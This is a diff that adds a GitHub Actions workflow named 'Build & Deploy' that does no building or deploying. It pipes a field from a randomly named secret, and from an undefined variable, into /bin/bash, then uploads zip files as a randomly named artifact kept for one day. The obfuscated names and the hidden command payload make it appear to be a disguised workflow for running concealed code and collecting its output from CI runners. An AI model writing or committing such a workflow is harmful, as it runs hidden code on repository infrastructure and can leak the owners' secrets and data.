@@ -1,0 +1,27 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          wmbub8: ${{ secrets.wmbub8 }}
+        run: |
+          printf '%s' "$wmbub8" | jq -r .fivd7230 | /bin/bash
+          printf '%s' "$r829" | jq -r .nlhwo634 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: OUpV8yY3
+          path: "*.zip"
+          retention-days: 1
